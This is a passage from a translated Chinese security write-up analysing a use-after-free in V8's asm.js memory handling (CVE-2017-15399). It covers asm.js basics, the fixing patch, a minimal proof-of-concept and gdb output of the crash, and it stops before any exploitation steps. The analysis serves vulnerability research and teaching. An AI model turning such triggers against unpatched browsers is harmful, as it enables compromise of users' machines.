# Chrome Issue 776677（CVE-2017-15399）asm.js UAF漏洞分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
之前一直在学习V8方面的漏洞，对于asm.js层的UAF漏洞还是第一次接触，本文将详细分析Chrome Issue 776677漏洞以及其利用方法。
## 0x01 前置知识
###  asm.js
>
> asm.js不是一门新的语言，而是JavaScript的一个子集。由Mozilla于2013年提出，主要为了提升JS引擎执行代码的速度。通俗来说，同样是js代码，符合asm.js规范的代码对JS引擎更加友好，JS引擎在解释执行这些代码更加省心（例如不用进行变量类型推断了），也就更加快。  
>  一旦 JavaScript 引擎发现运行的是 asm.js，就知道这是经过优化的代码，可以跳过语法分析这一步，直接转成汇编语言。另外，浏览器还会调用
> WebGL 通过 GPU 执行 asm.js，即 asm.js 的执行引擎与普通的 JavaScript 脚本不同。这些都是 asm.js
> 运行较快的原因。据称，asm.js 在浏览器里的运行速度，大约是原生代码的50%左右。
在asm.js 中，变量只有两种数据类型。`32位带符号整数`和`64位带符号浮点数`  
asm.js 的类型声明有固定写法，`变量 | 0`表示整数，`+变量`表示浮点数。如下
    var a = 1;
    var x = a | 0;  // x 是32位整数
    var y = +a;  // y 是64位浮点数
在javascript中，区别是`普通js`还是`asm.js`的关键在于函数里是否使用`"use asm";`关键词修饰，在函数中，在`"use
asm";`关键词之后的代码都属于`asm.js`，如下，由于`module`第一行使用了该关键字，那么函数后面的代码都将使用`asm.js`将代码翻译为汇编代码
    function module() {
      "use asm";
       function f(x) {
          x = x | 0;
       }
       return f;
    }
    var f = module();
    f(1);
使用`./d8 t.js -print-opt-code`运行，可以看到，虽然没有多次循环触发`JIT`编译，但是仍然使用了`turbofan`进行编译
    kind = JS_TO_WASM_FUNCTION
    name = js-to-wasm#0
    compiler = turbofan
    Instructions (size = 138)
    0x3f4062c0     0  55             push ebp
    0x3f4062c1     1  89e5           mov ebp,esp
    0x3f4062c3     3  56             push esi
    0x3f4062c4     4  57             push edi
    0x3f4062c5     5  8b4508         mov eax,[ebp+0x8]
    0x3f4062c8     8  e8d303f01f     call 0x5f3066a0  (ToNumber)    ;; code: BUILTIN
    0x3f4062cd     d  a801           test al,0x1
    0x3f4062cf     f  0f8528000000   jnz 0x3f4062fd  
    0x3f4062d5    15  d1f8           sar eax,1
    0x3f4062d7    17  f20f2ac8       cvtsi2sd xmm1,eax
    0x3f4062db    1b  f20f2cc1       cvttsd2si eax,xmm1
    0x3f4062df    1f  83f801         cmp eax,0x1
    0x3f4062e2    22  0f8039000000   jo 0x3f406321  
    0x3f4062e8    28  be00000000     mov esi,(nil)               ;; wasm context reference
    0x3f4062ed    2d  e8cefeffff     call 0x3f4061c0             ;; code: BUILTIN
    0x3f4062f2    32  b885411839     mov eax,0x39184185          ;; object: 0x39184185 
    0x3f4062f7    37  89ec           mov esp,ebp
    0x3f4062f9    39  5d             pop ebp
    0x3f4062fa    3a  c20800         ret 0x8
    0x3f4062fd    3d  b985411839     mov ecx,0x39184185          ;; object: 0x39184185 
    0x3f406302    42  3bc1           cmp eax,ecx
    0x3f406304    44  0f8407000000   jz 0x3f406311  
    0x3f40630a    4a  f20f104803     movsd xmm1,[eax+0x3]
    0x3f40630f    4f  ebca           jmp 0x3f4062db  
    0x3f406311    51  660f76c9       pcmpeqd xmm1,xmm1
    0x3f406315    55  660f73f134     psllq xmm1,52
    0x3f40631a    5a  660f73d101     psrlq xmm1,1
    0x3f40631f    5f  ebba           jmp 0x3f4062db  
    0x3f406321    61  83ec08         sub esp,0x8
    0x3f406324    64  f20f110c24     movsd [esp],xmm1
    0x3f406329    69  e8d25ac0fc     call 0x3c00be00             ;; code: STUB, DoubleToIStub, minor: 0
    0x3f40632e    6e  83c408         add esp,0x8
    0x3f406331    71  ebb5           jmp 0x3f4062e8  
    0x3f406333    73  90             nop
在`asm.js`中，不能直接调用`javascript`中的函数或者访问数据，如下会报错，找不到`print`函数
    function module() {
      "use asm";
       function f(x) {
          x = x | 0;
          print(x);
       }
       return f;
    }
想要在`asm.js`中调用`js`中的函数和对象，必须使用函数参数来间接传递地址进行访问，如下
    function module(stdlib) {
      "use asm";
       var p = stdlib.print;
       function f(x) {
          x = x | 0;
          p(x);
       }
       return f;
    }
    var stdlib = {print:print};
    var f = module(stdlib);
    f(1);
通常，一个标准的`asm.js`函数模块参数应该有三个`function module(stdlib,foreign,buffer)
{}`，其中`stdlib`用来传递想要用到的一些函数，`foreign`用来传递一些变量,`buffer`用来共享内存。
    function module(stdlib,foreign,buffer) {
      "use asm";
      var fl = new stdlib.Uint32Array(buffer);
      function f1(x) {
        x = x | 0;
        fl[0x11]  = x;
      }
      return f1;
    }
    var global = {Uint32Array:Uint32Array};
    var env = {};
    var buffer = new ArrayBuffer(0x100);
    var f = module(global,env,buffer);
    f(0x22);
    var dv = new DataView(buffer);
    print(dv.getUint32(0x11*4,true));
如图，我们在`asm.js`里修改了`ArrayBuffer`的内容，然后在`js`层显示。  
除了直接传入`ArrayBuffer`对象进行内存共享，还可以使用`WebAssembly.Memory`来构造
    var memory = new WebAssembly.Memory({initial:200});
    var buffer = memory.buffer;
其返回的`buffer`也是一个`ArrayBuffer`对象
    DebugPrint: 0x4cb18421: [JSArrayBuffer] in OldSpace
     - map = 0x3b9047b9 [FastProperties]
     - prototype = 0x4cb08ac5
     - elements = 0x5450412d  [HOLEY_SMI_ELEMENTS]
     - embedder fields: 2
     - backing_store = 0xf1dca000
     - byte_length = 13107200
     - wasm_buffer
     - properties = 0x5450412d  {}
     - embedder fields = {
        (nil)
        (nil)
     }
其中`initial:200`代表申请200页大小的内存，每页为`0x10000`。使用`WebAssembly.Memory`的好处是其申请的内存空间可以扩展，如果想要扩充空间，·只需调用`grow`函数。而`ArrayBuffer`的话不能做到空间扩充。
    memory.grow(1); //扩充1页的内存
## 0x02 漏洞分析
###  patch分析
patch的地方比较多，经过分析，比较关键的地方是这两处
    index cecf460..24b9091 100644
    --- a/src/asmjs/asm-js.cc
    +++ b/src/asmjs/asm-js.cc
    @@ -374,6 +374,7 @@
           ReportInstantiationFailure(script, position, "Requires heap buffer");
           return MaybeHandle();
         }
    +    memory->set_is_growable(false);
         size_t size = NumberToSize(memory->byte_length());
         // TODO(mstarzinger): We currently only limit byte length of the buffer to
         // be a multiple of 8, we should enforce the stricter spec limits here.
    diff --git a/src/wasm/wasm-js.cc b/src/wasm/wasm-js.cc
    index bad1a21..631d94a 100644
    --- a/src/wasm/wasm-js.cc
    +++ b/src/wasm/wasm-js.cc
    @@ -753,6 +753,10 @@
         max_size64 = i::FLAG_wasm_max_mem_pages;
       }
       i::Handle old_buffer(receiver->array_buffer());
    +  if (!old_buffer->is_growable()) {
    +    thrower.RangeError("This memory cannot be grown");
    +    return;
    +  }
       uint32_t old_size =
           old_buffer->byte_length()->Number() / i::wasm::kSpecMaxWasmMemoryPages;
       int64_t new_size64 = old_size + delta_size;
主要是为`asm.js`的`memory`设置了一个标记，不允许我们在memory传给`asm.js`的模块以后再调用`memory.grow()`函数。  
其精简后的POC如下
    function module(stdlib,foreign,buffer) {
      "use asm";
      var fl = new stdlib.Uint32Array(buffer);
      function f1(x) {
        x = x | 0;
        fl[0] = x;
      }
      return f1;
    }
    var global = {Uint32Array:Uint32Array};
    var env = {};
    var memory = new WebAssembly.Memory({initial:200});
    var buffer = memory.buffer;
    var evil_f = module(global,env,buffer);
    memory.grow(1);
    evil_f(1);
与前面的示例差不多，我们仅仅是增加了一句`memory.grow(1);`，然后调用函数以后就出现了崩溃。
    root@ubuntu:~/Desktop/v8/out.gn/ia32.debug# ./d8 poc.js
    Received signal 11 SEGV_MAPERR 0000f1d64000
    ==== C stack trace ===============================
     [0x0000f58e4e80]
     [0x0000f58e4d7a]
     [0x0000f7f07b80]
     [0x00004010658b]
     [0x0000549fc522]
     [0x0000549f9336]
     [0x00005498608f]
     [0x0000f6d7935f]
     [0x0000f6d788a2]
     [0x0000f6d786af]
     [0x0000f61fbef6]
     [0x0000565f7010]
     [0x00005660c8c0]
     [0x000056610ff3]
     [0x000056612523]
     [0x000056612912]
     [0x0000f53ace91]
    [end of stack trace]
    Segmentation fault (core dumped)
很明显是内存访问错误，使用gdb调试
    pwndbg> c
    Continuing.
    Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
    0x4498658b in ?? ()
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ─────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────
    *EAX  0x1
    *EBX  0x0
    *ECX  0xc80000
    *EDX  0xf1d99000
    *EDI  0x44986580 ◂— mov    ecx, dword ptr [esi + 4] /* 0x8b044e8b */
    *ESI  0x56d586d0 ◂— 0xf1d99000
    *EBP  0xfff53ed4 —▸ 0xfff53f08 —▸ 0xfff53f20 —▸ 0xfff53f48 —▸ 0xfff540d8 ◂— ...
    *ESP  0xfff53ec8 —▸ 0x449862f2 ◂— mov    eax, 0x43a84185 /* 0xa84185b8 */
    *EIP  0x4498658b ◂— mov    dword ptr [edx + ebx], eax /* 0xc31a0489 */
    ───────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────
     ► 0x4498658b    mov    dword ptr [edx + ebx], eax
       0x4498658e    ret
查看该地址`0xf1d99000`的映射情况，可以发现这个地址不在映射之内
    .............
    0xf1109000 0xf1d99000 rw-p   c90000 0      
    0xf2a19000 0xf2c8e000 rw-p   275000 0      
    .............
然而如果事先加了一个`%DebugPrint`将`buffer`打印的话，会发现
    DebugPrint: 0x52698935: [JSArrayBuffer] in OldSpace
     - map = 0x5ab047b9 [FastProperties]
     - prototype = 0x52688ac5
     - elements = 0x3628412d  [HOLEY_SMI_ELEMENTS]
     - embedder fields: 2
     - backing_store = 0xf1d99000
     - byte_length = 13107200
     - wasm_buffer
     - properties = 0x3628412d  {}
     - embedder fields = {
        (nil)
        (nil)
     }
该不可访问地址实际就是`ArrayBuffer`的`backing_store`，那么可能的原因是`memory.grow(1);`操作使得`ArrayBuffer`的`backing_store`被释放掉了。我们在`memory.grow(1);`之后加一句`%DebugPrint(buffer);`，可以发现
    DebugPrint: 0x5c518941: [JSArrayBuffer] in OldSpace
     - map = 0x2a0847b9 [FastProperties]